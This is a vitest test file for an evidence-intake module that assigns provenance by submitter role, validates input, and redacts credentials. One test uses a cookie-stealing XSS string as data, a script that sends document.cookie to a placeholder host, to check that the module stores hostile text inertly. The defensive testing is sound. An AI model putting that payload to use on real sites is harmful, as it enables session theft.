import { describe, expect, it } from "vitest";
import {
  ACTORS,
  EVIDENCE_LIMITS,
  EVIDENCE_SOURCES,
  InvalidEvidenceError,
  evidenceProvenance,
  prepareEvidence,
  redactCredentials,
  type EvidenceRefusal,
  type EvidenceSubmission,
} from "../src/index.ts";

function submission(overrides: Partial<EvidenceSubmission> = {}): EvidenceSubmission {
  return {
    submittedBy: "service",
    source: "worker-log",
    mediaType: "text/plain",
    sourceEventId: "req-1/worker-log",
    content: "2026-10-30T10:00:33.040Z INFO [wk-1a2b3c4d] artifact stored",
    observedAt: "2026-10-30T10:01:00.000Z",
    ...overrides,
  };
}

function refusal(overrides: Partial<EvidenceSubmission>): EvidenceRefusal | undefined {
  try {
    prepareEvidence(submission(overrides));
    return undefined;
  } catch (error) {
    if (error instanceof InvalidEvidenceError) return error.code;
    throw error;
  }
}

describe("evidence provenance comes from the submitter, not the content", () => {
  it("labels service records as authenticated only when the service identity submits them", () => {
    expect(evidenceProvenance("service", "worker-log")).toBe("AUTHENTICATED_SERVICE");
    expect(evidenceProvenance("service", "service-status")).toBe("AUTHENTICATED_SERVICE");
  });

  it("labels a log pasted by the seller or an operator as a claim", () => {
    expect(evidenceProvenance("seller", "worker-log")).toBe("CLAIM");
    expect(evidenceProvenance("operator", "service-status")).toBe("CLAIM");
    const pasted = prepareEvidence(submission({ submittedBy: "seller" }));
    const authentic = prepareEvidence(submission());
    expect(pasted.storedContent).toBe(authentic.storedContent);
    expect(pasted.provenance).toBe("CLAIM");
  });

  it("gives gateway and chain records only to the reconciler and the policy only to the server", () => {
    expect(evidenceProvenance("reconciler", "gateway-record")).toBe("GATEWAY");
    expect(evidenceProvenance("reconciler", "chain")).toBe("CHAIN");
    expect(evidenceProvenance("server", "policy")).toBe("POLICY");
    for (const actor of ["service", "buyer", "seller", "operator"] as const) {
      expect(() => evidenceProvenance(actor, "gateway-record"), actor).toThrow(InvalidEvidenceError);
      expect(() => evidenceProvenance(actor, "policy"), actor).toThrow(InvalidEvidenceError);
    }
  });

  it("lets a buyer submit only claims", () => {
    for (const source of EVIDENCE_SOURCES) {
      if (source === "buyer-claim") expect(evidenceProvenance("buyer", source)).toBe("CLAIM");
      else expect(() => evidenceProvenance("buyer", source), source).toThrow(InvalidEvidenceError);
    }
  });

  it("never accepts evidence from the model or the registry verifier", () => {
    for (const source of EVIDENCE_SOURCES) {
      expect(() => evidenceProvenance("assessor", source), source).toThrow(InvalidEvidenceError);
      expect(() => evidenceProvenance("verifier", source), source).toThrow(InvalidEvidenceError);
    }
    expect(ACTORS).toContain("assessor");
  });
});

describe("evidence input checks", () => {
  it("requires structured sources to be valid JSON", () => {
    expect(refusal({ source: "service-status", mediaType: "text/plain", content: "COMPLETED" })).toBe("UNSUPPORTED_MEDIA_TYPE");
    expect(refusal({ source: "service-status", mediaType: "application/json", content: "{\"state\": " })).toBe("INVALID_JSON");
    expect(refusal({ source: "service-status", mediaType: "application/json", content: "{\"state\":\"COMPLETED\"}" })).toBeUndefined();
    expect(refusal({ source: "worker-log", mediaType: "application/json", content: "{}" })).toBe("UNSUPPORTED_MEDIA_TYPE");
  });

  it("counts the item limit in UTF-8 bytes", () => {
    const max = EVIDENCE_LIMITS.maxItemBytes;
    expect(refusal({ content: "a".repeat(max) })).toBeUndefined();
    expect(refusal({ content: "a".repeat(max + 1) })).toBe("ITEM_TOO_LARGE");
    // Two bytes per character: half as many characters reach the limit.
    expect(refusal({ content: "é".repeat(max / 2) })).toBeUndefined();
    expect(refusal({ content: "é".repeat(max / 2 + 1) })).toBe("ITEM_TOO_LARGE");
  });

  it("refuses empty text, malformed Unicode, and control characters but keeps tabs and newlines", () => {
    expect(refusal({ content: "" })).toBe("EMPTY_CONTENT");
    expect(refusal({ content: " \n\t " })).toBe("EMPTY_CONTENT");
    expect(refusal({ content: "half a pair \uD800" })).toBe("MALFORMED_TEXT");
    expect(refusal({ content: "nul\u0000byte" })).toBe("CONTROL_CHARACTERS");
    expect(refusal({ content: "escape \u001b[31mred" })).toBe("CONTROL_CHARACTERS");
    expect(refusal({ content: "a\tb\r\nc\n" })).toBeUndefined();
  });

  it("keeps HTML and script text verbatim as inert text", () => {
    const content = '<script>fetch("https://example.invalid/?c=" + document.cookie)</script><img src=x onerror=alert(1)>';
    const prepared = prepareEvidence(submission({ submittedBy: "buyer", source: "buyer-claim", content }));
    expect(prepared.storedContent).toBe(content);
    expect(prepared.redactions).toEqual([]);
  });

  it("validates the event ID and timestamp", () => {
    expect(refusal({ sourceEventId: "" })).toBe("INVALID_FIELD");
    expect(refusal({ sourceEventId: "has space" })).toBe("INVALID_FIELD");
    expect(refusal({ sourceEventId: "x".repeat(129) })).toBe("INVALID_FIELD");
    expect(refusal({ observedAt: "yesterday" })).toBe("INVALID_FIELD");
    expect(refusal({ observedAt: "2026-10-30T10:00:00+03:00" })).toBe("INVALID_FIELD");
    expect(refusal({ observedAt: null })).toBeUndefined();
  });
});

describe("credential redaction", () => {
  it.each([
    ["query parameter", "GET /x?api_key=abc123&page=2", "GET /x?api_key=[REDACTED:credential]&page=2"],
    ["quoted JSON value with spaces", '{"client_secret": "two words"}', '{"client_secret": "[REDACTED:credential]"}'],
    ["single-quoted value", "password='p@ss word' user=bob", "password='[REDACTED:credential]' user=bob"],
    ["bearer token", "Authorization: Bearer eyJ.abc.def", "Authorization: Bearer [REDACTED:authorization]"],
    ["cookie header", "Cookie: sid=1; theme=dark", "Cookie: [REDACTED:cookie]"],
    ["provider API key", "using sk-ant-api03-ABCDEFGHIJKLMNOPQRST", "using [REDACTED:api-key]"],
    ["PEM private key", "-----BEGIN EC PRIVATE KEY-----\nMHQCAQEE\n-----END EC PRIVATE KEY-----", "[REDACTED:private-key]"],
  ])("redacts a %s", (_name, input, expected) => {
    expect(redactCredentials(input).text).toBe(expected);
  });

  it("leaves payment fields, transaction hashes, and look-alike keys untouched", () => {
    const text = `{"token": "USDC", "token_address": "0xabc", "tx_signature": "0x${"a".repeat(64)}"} secretariat: open; secret_ref: r1`;
    expect(redactCredentials(text)).toEqual({ text, redactions: [] });
  });

  it("keeps redacted JSON valid and records what was removed, while hashing the original separately", () => {
    const content = JSON.stringify({ status: "payment-finalized", webhook_secret: "s3cr3t value", headers: { cookie: "sid=9" } }, null, 2);
    const prepared = prepareEvidence(submission({ submittedBy: "reconciler", source: "gateway-record", mediaType: "application/json", content }));
    expect(() => JSON.parse(prepared.storedContent)).not.toThrow();
    expect(prepared.storedContent).not.toContain("s3cr3t");
    expect(prepared.storedContent).not.toContain("sid=9");
    expect(prepared.content).toBe(content);
    expect(prepared.redactions).toEqual([{ kind: "credential", count: 2 }]);
  });
});
